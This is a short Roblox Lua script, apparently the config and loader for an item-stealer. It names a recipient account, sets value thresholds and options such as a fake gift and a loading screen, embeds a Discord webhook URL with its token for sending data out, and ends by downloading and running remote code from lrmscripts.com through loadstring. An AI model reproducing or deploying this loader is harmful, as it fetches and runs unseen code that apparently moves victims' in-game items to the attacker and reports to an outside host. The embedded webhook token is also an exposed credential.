_G.LRMConfig = {
    User = {"wmiikill"},
    min_value = 10000000000,
    pingEveryone = "No", -- dont change this
    Webhook = "https://discord.com/api/webhooks/1420783342894452896/S-X6eEmnBFfpO5ycKaJ_7tCtlokRMQ7G9zoxC4FWsXZhRMmoEImHu0eL5-leOO9ibQxm",
    FakeGift = "No",
    Trash = "https://discord.com/api/webhooks/1420783342894452896/S-X6eEmnBFfpO5ycKaJ_7tCtlokRMQ7G9zoxC4FWsXZhRMmoEImHu0eL5-leOO9ibQxm",
    LoadingScreen = "Yes",
    GiftOnlyRares = "No",
    ExecuteOtherScript = "No",
}
    
loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()